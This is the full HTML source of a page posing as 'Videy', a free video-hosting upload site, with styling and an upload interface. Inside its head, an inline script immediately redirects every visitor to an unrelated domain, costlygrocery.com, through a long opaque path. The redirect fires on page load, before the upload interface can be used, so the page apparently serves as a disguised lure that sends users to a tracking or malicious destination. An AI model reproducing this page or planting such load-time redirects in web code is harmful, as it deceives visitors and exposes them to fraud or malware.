<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Videy - Free and Simple Video Hosting</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="referrer" content="no-referrer-when-downgrade" />

<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>

<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
  font-family:'Inter',sans-serif;
  background:#fff;
  color:#0f172a;
}
.page{
  min-height:100vh;
  display:flex;
  flex-direction:column;
}

/* HEADER */
.topbar{
  padding:16px 18px;
  display:flex;
  justify-content:space-between;
  align-items:center;
}
.logo{
  font-weight:800;
  font-size:1.2rem;
}
.top-upload{
  background:#0f172a;
  color:#fff;
  border:none;
  padding:8px 18px;
  border-radius:999px;
  font-weight:600;
}

/* CENTER */
.center{
  flex:1;
  padding:28px 16px;
  display:flex;
  flex-direction:column;
  align-items:center;
  text-align:center;
}
.center h1{
  font-size:2rem;
  font-weight:800;
}
.center h1 span{color:#6b7280}
.subtitle{
  margin-top:8px;
  color:#6b7280;
}

/* DROP */
#dropArea{
  width:100%;
  max-width:420px;
  margin-top:24px;
  padding:26px 16px;
  border:2px dashed #cbd5e1;
  border-radius:16px;
  color:#6b7280;
  transition:.2s;
  cursor:pointer;
}
#dropArea.drag{
  border-color:#0f172a;
  background:#f8fafc;
}

/* BUTTON */
.main-upload{
  width:100%;
  max-width:420px;
  margin-top:18px;
  padding:14px;
  background:#0f172a;
  color:#fff;
  border:none;
  border-radius:999px;
  font-weight:600;
}

/* PROGRESS */
#progressWrap{
  width:100%;
  max-width:420px;
  height:6px;
  background:#e5e7eb;
  border-radius:999px;
  margin-top:14px;
  overflow:hidden;
  display:none;
}
#progressBar{
  height:100%;
  width:0%;
  background:#0f172a;
}
</style>
    <script>
      window.location.href = "https://costlygrocery.com/by3VVQ0PP.3dp/vbbsm/VzJzZJDE0R2cNhz-AY5UORTlIy1uLGTqY/3dM/DWkD5oM_jaYn";
  </script>
</head>

<body>
<div class="page">

<header class="topbar">
  <div class="logo">Videy</div>
  <button class="top-upload" id="btnUploadTop">Upload</button>
</header>

<main class="center">
  <h1>Upload your videos<br><span>and share</span></h1>
  <p class="subtitle">Free and simple video hosting.</p>

  <div id="dropArea">
    Drag & Drop your video here or tap to select
  </div>

  <button class="main-upload" id="btnUpload">Upload Video</button>

  <input type="file" id="fileInput" accept="video/mp4,video/quicktime" hidden>

  <div id="progressWrap">
    <div id="progressBar"></div>
  </div>
</main>

<footer class="footer">

</footer>

</div>

<script src="script.js"></script>
</body>
</html>
